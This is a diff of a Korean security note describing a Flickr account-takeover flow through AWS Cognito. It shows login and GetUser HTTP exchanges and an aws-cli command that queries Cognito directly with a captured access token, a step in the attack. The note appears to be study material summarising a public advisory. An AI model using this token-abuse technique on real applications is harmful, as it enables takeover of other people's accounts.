@@ -94,6 +94,9 @@ Flickr Access Takeover Attack Flow
 1. 개요
 >- 앱에 로그인하면 POST요청이 AWS Cognito로 전송
 - 자격증명이 유효한 경우 AWS Cognito에서 토큰을 제공
+
+<pre>
+<code>
 ```HTTP/2 200 OK
 Date: Thu, 32 Abc 2040 25:51:36 GMT
 [...]{
@@ -109,6 +112,8 @@ Date: Thu, 32 Abc 2040 25:51:36 GMT
         {            
         }
 }```
+</code>
+</pre>
 
 - 그 이후 앱에서 AWS Cognito에 요청을 보내 사용자 세부정보를 가져오는 과정을 거치는데 ‘X-Amz-Target: AWSCognitoIdentityProviderService.GetUser’헤더의 AccessToken과 함꼐 게시 요청으로 전송
 <pre>
@@ -124,7 +129,10 @@ Content-Length: 1021
 Connection: close{"AccessToken":"<AccessToken>"}
 </code>
 </pre>
+
 - 사용자 속성은 응답값을 통해서 확인 가능
+<pre>
+<code>
 ``` {
 "UserAttributes": [
 {
@@ -150,6 +158,9 @@ Connection: close{"AccessToken":"<AccessToken>"}
 ],
 "Username": "sdfdsfdff8b142bb58"
 } ```
+</code>
+</pre>
+
 - 공격절차
 - 로그인 후 획득한 AccessToken은 AWS-CLI에서 바로 사용이 가능하며 Flickr Account Takeover(https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/#amazon-cognito)블로깅 내용에 따라 아래 명령어를 사용해 사용자 속성 확인이 가능
 aws --no-verify-ssl cognito-idp get-user --region eu-west-1 --access-token <Insert Token Here>
